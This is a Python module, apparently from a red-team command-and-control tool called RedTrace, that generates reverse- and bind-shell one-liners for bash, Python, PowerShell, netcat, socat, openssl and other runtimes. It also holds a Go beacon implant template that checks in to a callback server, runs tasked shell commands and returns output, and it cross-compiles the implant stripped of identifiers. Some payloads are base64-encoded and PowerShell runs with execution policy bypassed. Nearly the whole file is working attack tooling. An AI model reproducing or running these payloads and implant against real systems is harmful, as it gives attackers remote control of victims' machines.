from __future__ import annotations

import base64
import json
import os
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Any


ONELINER_KINDS = {
    "http_beacon": ("curl_beacon",),
    "https_beacon": ("curl_beacon",),
    "websocket": ("curl_beacon",),
    "tcp_reverse": (
        "bash", "bash_udp", "python", "php", "perl", "ruby", "node", "java",
        "lua", "awk", "nc", "ncat", "socat", "openssl", "powershell",
    ),
    "tcp_bind": ("nc_bind", "ncat_bind", "socat_bind", "python_bind", "powershell_bind"),
}


def listener_type(metadata: dict[str, Any]) -> str:
    value = str(metadata.get("listener_type") or metadata.get("type") or "http_beacon")
    return value.strip().lower()


def callback_host(metadata: dict[str, Any], override: str = "") -> str:
    value = override.strip() or str(
        metadata.get("target_host")
        if listener_type(metadata) == "tcp_bind"
        else metadata.get("callback_host") or metadata.get("bind_host") or ""
    )
    if value in {"", "0.0.0.0", "::", "127.0.0.1", "localhost"}:
        raise ValueError("请输入目标能够访问的回连地址")
    return value


def compatible_oneliners(metadata: dict[str, Any]) -> tuple[str, ...]:
    return ONELINER_KINDS.get(listener_type(metadata), ())


def generate_oneliner(
    *,
    metadata: dict[str, Any],
    listener_id: str,
    listener_token: str,
    kind: str,
    host_override: str = "",
) -> str:
    ltype = listener_type(metadata)
    kind = kind.strip().lower()
    if kind not in compatible_oneliners(metadata):
        raise ValueError(f"{ltype} 不支持 {kind}，可用类型：{', '.join(compatible_oneliners(metadata))}")
    if kind == "curl_beacon":
        base_url = str(metadata.get("callback_url") or "").rstrip("/")
        if not base_url:
            host = callback_host(metadata, host_override)
            port = int(metadata.get("bind_port") or 0)
            if not 1 <= port <= 65535:
                raise ValueError("监听端口无效")
            scheme = "https" if ltype == "https_beacon" else "http"
            base_url = f"{scheme}://{host}:{port}"
        checkin = f"{base_url}/c2/checkin/{listener_id}"
        body = (
            '{"external_id":"curl-$(hostname)","hostname":"$(hostname)",'
            '"username":"$(whoami)","os":"$(uname -s)","arch":"$(uname -m)",'
            '"process":"curl","capabilities":["command"]}'
        )
        return (
            "bash -c 'while :; do "
            f"curl -fsSk -H \"X-RedTrace-Listener-Token: {listener_token}\" "
            "-H \"Content-Type: application/json\" "
            f"-X POST \"{checkin}\" -d '\\''{body}'\\'' >/dev/null 2>&1; "
            "sleep 5; done' &"
        )
    host = callback_host(metadata, host_override)
    port = int(metadata.get("bind_port") or 0)
    if not 1 <= port <= 65535:
        raise ValueError("监听端口无效")
    if kind == "bash":
        return f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
    if kind == "bash_udp":
        return f"bash -c 'sh -i >& /dev/udp/{host}/{port} 0>&1'"
    if kind == "python":
        script = (
            "import socket,os,pty;"
            f"s=socket.socket();s.connect(({host!r},{port}));"
            "[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn('/bin/sh')"
        )
        encoded = base64.b64encode(script.encode()).decode()
        return f"python3 -c \"import base64;exec(base64.b64decode('{encoded}'))\""
    if kind == "powershell":
        script = (
            f"$c=New-Object Net.Sockets.TcpClient('{host}',{port});$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$o=(iex $d 2>&1|Out-String);$r=([text.encoding]::ASCII).GetBytes($o);"
            "$s.Write($r,0,$r.Length);$s.Flush()};$c.Close()"
        )
        encoded = base64.b64encode(script.encode("utf-16le")).decode()
        return f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"
    if kind == "php":
        return f"php -r '$s=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    if kind == "perl":
        return f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
    if kind == "ruby":
        return f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    if kind == "node":
        return f"node -e 'const n=require(\"net\"),s=require(\"child_process\").spawn(\"/bin/sh\",[]),c=new n.Socket();c.connect({port},\"{host}\",()=>{{c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c)}})'"
    if kind == "java":
        return f"jshell -q <<< 'new ProcessBuilder(\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\").start();'"
    if kind == "lua":
        return f"lua -e 'local s=require(\"socket\").tcp();s:connect(\"{host}\",{port});while true do local r,x=s:receive();local f=io.popen(r,\"r\");local b=f:read(\"*a\");f:close();s:send(b);end'"
    if kind == "awk":
        return f"awk 'BEGIN {{s=\"/inet/tcp/0/{host}/{port}\";while(42){{do{{printf \"shell>\"|&s;s|&getline c;if(c){{while((c|&getline)>0)print $0|&s;close(c)}}}}while(c!=\"exit\")}}close(s)}}' /dev/null"
    if kind == "nc":
        return f"nc {host} {port} -e /bin/sh"
    if kind == "ncat":
        return f"ncat {host} {port} -e /bin/sh"
    if kind == "socat":
        return f"socat TCP:{host}:{port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"
    if kind == "openssl":
        return f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {host}:{port} > /tmp/s; rm /tmp/s"
    if kind == "nc_bind":
        return f"nc -lvnp {port} -e /bin/sh"
    if kind == "ncat_bind":
        return f"ncat -lvnp {port} -e /bin/sh"
    if kind == "socat_bind":
        return f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"
    if kind == "python_bind":
        script = (
            "import socket,os,pty;s=socket.socket();"
            f"s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{port}));"
            "s.listen(1);c,_=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];pty.spawn('/bin/sh')"
        )
        encoded = base64.b64encode(script.encode()).decode()
        return f"python3 -c \"import base64;exec(base64.b64decode('{encoded}'))\""
    if kind == "powershell_bind":
        script = (
            f"$l=[Net.Sockets.TcpListener]::new([Net.IPAddress]::Any,{port});$l.Start();"
            "$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=([text.encoding]::ASCII).GetString($b,0,$i);"
            "$o=(iex $d 2>&1|Out-String);$r=([text.encoding]::ASCII).GetBytes($o);$s.Write($r,0,$r.Length)}"
        )
        encoded = base64.b64encode(script.encode("utf-16le")).decode()
        return f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"

    raise ValueError(f"unsupported payload kind: {kind}")


GO_BEACON_TEMPLATE = r'''package main

import (
  "bytes"
  "encoding/json"
  "fmt"
  "io"
  "net/http"
  "os"
  "os/exec"
  "os/user"
  "runtime"
  "time"
)

const baseURL = {{BASE_URL}}
const listenerID = {{LISTENER_ID}}
const listenerToken = {{LISTENER_TOKEN}}
const sleepSeconds = {{SLEEP}}

type checkinResponse struct {
  SessionID string `json:"session_id"`
  SessionToken string `json:"session_token"`
}
type task struct {
  ID string `json:"id"`
  Action string `json:"action"`
  Arguments map[string]any `json:"arguments"`
}
type pollResponse struct { Tasks []task `json:"tasks"` }

func request(method, url, token string, body any) ([]byte, error) {
  var reader io.Reader
  if body != nil {
    b, err := json.Marshal(body)
    if err != nil { return nil, err }
    reader = bytes.NewReader(b)
  }
  req, err := http.NewRequest(method, url, reader)
  if err != nil { return nil, err }
  req.Header.Set("Content-Type", "application/json")
  if token != "" { req.Header.Set("X-RedTrace-Session-Token", token) }
  client := &http.Client{Timeout: 60 * time.Second}
  resp, err := client.Do(req)
  if err != nil { return nil, err }
  defer resp.Body.Close()
  if resp.StatusCode < 200 || resp.StatusCode >= 300 {
    return nil, fmt.Errorf("http %d", resp.StatusCode)
  }
  return io.ReadAll(resp.Body)
}

func checkin() (checkinResponse, error) {
  hostname, _ := os.Hostname()
  current, _ := user.Current()
  username := ""
  if current != nil { username = current.Username }
  payload := map[string]any{
    "external_id": hostname + "-" + fmt.Sprint(os.Getpid()),
    "hostname": hostname, "username": username, "os": runtime.GOOS,
    "arch": runtime.GOARCH, "process": os.Args[0], "pid": os.Getpid(),
    "capabilities": []string{"command"},
  }
  b, _ := json.Marshal(payload)
  req, err := http.NewRequest("POST", baseURL+"/c2/checkin/"+listenerID, bytes.NewReader(b))
  if err != nil { return checkinResponse{}, err }
  req.Header.Set("Content-Type", "application/json")
  req.Header.Set("X-RedTrace-Listener-Token", listenerToken)
  resp, err := (&http.Client{Timeout: 60 * time.Second}).Do(req)
  if err != nil { return checkinResponse{}, err }
  defer resp.Body.Close()
  var result checkinResponse
  err = json.NewDecoder(resp.Body).Decode(&result)
  return result, err
}

func run(t task) (bool, string) {
  if t.Action != "command" { return false, "unsupported action: " + t.Action }
  command, _ := t.Arguments["command"].(string)
  var cmd *exec.Cmd
  if runtime.GOOS == "windows" { cmd = exec.Command("cmd.exe", "/d", "/s", "/c", command) } else { cmd = exec.Command("/bin/sh", "-c", command) }
  output, err := cmd.CombinedOutput()
  if err != nil { return false, string(output) + "\n" + err.Error() }
  return true, string(output)
}

func main() {
  var session checkinResponse
  for {
    if session.SessionID == "" {
      value, err := checkin()
      if err == nil { session = value }
    } else {
      data, err := request("POST", baseURL+"/c2/sessions/"+session.SessionID+"/poll", session.SessionToken, nil)
      if err != nil { session = checkinResponse{} } else {
        var poll pollResponse
        _ = json.Unmarshal(data, &poll)
        for _, t := range poll.Tasks {
          ok, output := run(t)
          _, _ = request("POST", baseURL+"/c2/sessions/"+session.SessionID+"/results/"+t.ID, session.SessionToken, map[string]any{
            "success": ok, "output": output, "summary": output,
          })
        }
      }
    }
    time.Sleep(time.Duration(sleepSeconds) * time.Second)
  }
}
'''


def build_beacon(
    *,
    output_dir: Path,
    listener_id: str,
    listener_token: str,
    metadata: dict[str, Any],
    callback_url: str,
    target_os: str,
    target_arch: str,
    sleep_seconds: int = 5,
) -> Path:
    if shutil.which("go") is None:
        raise RuntimeError("未找到 Go 编译器，无法构建 Beacon")
    target_os = target_os.strip().lower()
    target_arch = target_arch.strip().lower()
    if target_os not in {"linux", "windows", "darwin"}:
        raise ValueError("目标系统仅支持 linux、windows、darwin")
    if target_arch not in {"amd64", "arm64", "386"}:
        raise ValueError("目标架构仅支持 amd64、arm64、386")
    callback_url = (callback_url.strip() or str(metadata.get("callback_url") or "")).rstrip("/")
    if not callback_url:
        host = callback_host(metadata)
        scheme = "https" if listener_type(metadata) == "https_beacon" else "http"
        callback_url = f"{scheme}://{host}:{int(metadata.get('bind_port') or 0)}"
    output_dir.mkdir(parents=True, exist_ok=True)
    suffix = ".exe" if target_os == "windows" else ""
    filename = f"beacon_{target_os}_{target_arch}_{listener_id}{suffix}"
    output_path = output_dir / filename
    replacements = {
        "{{BASE_URL}}": json.dumps(callback_url),
        "{{LISTENER_ID}}": json.dumps(listener_id),
        "{{LISTENER_TOKEN}}": json.dumps(listener_token),
        "{{SLEEP}}": str(max(1, min(int(sleep_seconds), 3600))),
    }
    source = GO_BEACON_TEMPLATE
    for needle, value in replacements.items():
        source = source.replace(needle, value)
    with tempfile.TemporaryDirectory(prefix=".build-", dir=output_dir) as work:
        work_dir = Path(work)
        (work_dir / "main.go").write_text(source, encoding="utf-8")
        env = dict(os.environ)
        env.update({"GOOS": target_os, "GOARCH": target_arch, "CGO_ENABLED": "0"})
        completed = subprocess.run(
            [
                "go",
                "build",
                "-trimpath",
                "-ldflags=-s -w -buildid=",
                "-o",
                str(output_path),
                "main.go",
            ],
            cwd=work_dir,
            env=env,
            capture_output=True,
            text=True,
            timeout=180,
            check=False,
        )
        if completed.returncode:
            raise RuntimeError((completed.stderr or completed.stdout or "Beacon 构建失败").strip())
    return output_path
